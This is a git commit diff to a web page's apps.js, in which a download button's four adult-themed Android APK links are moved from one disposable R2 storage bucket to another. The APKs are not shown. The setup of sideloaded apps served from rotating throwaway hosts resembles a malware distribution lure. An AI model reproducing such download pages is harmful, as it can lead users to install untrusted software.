266d3e85ef4454c91749f1153ec9ac479e0c68b0
reiscanreis <reiscanreis6@gmail.com>
2026-02-09 18:35:41 +0300

    Update apps.js

--- apps.js
+++ apps.js
@@ -4,10 +4,10 @@ document.addEventListener("DOMContentLoaded", () => {
   const btn = document.getElementById('download-button');
 
   const apkLinks = [
-    "https://pub-9fa0501cedbc43239212ac75c954f8cb.r2.dev/TurkPornoV1.apk",
-    "https://pub-9fa0501cedbc43239212ac75c954f8cb.r2.dev/TurkPornoV2.apk", 
-    "https://pub-9fa0501cedbc43239212ac75c954f8cb.r2.dev/TurkPornoV3.apk",
-    "https://pub-9fa0501cedbc43239212ac75c954f8cb.r2.dev/TurkPornoV4.apk"
+    "https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV1.apk",
+    "https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV2.apk", 
+    "https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV3.apk",
+    "https://pub-408386868c184d5a97d3f40fb9ede939.r2.dev/TurkPornoV4.apk"
   ];
 
   btn.addEventListener('click', () => {
@@ -31,3 +31,4 @@ document.addEventListener("DOMContentLoaded", () => {
     }, 3000);
   });
 });
+
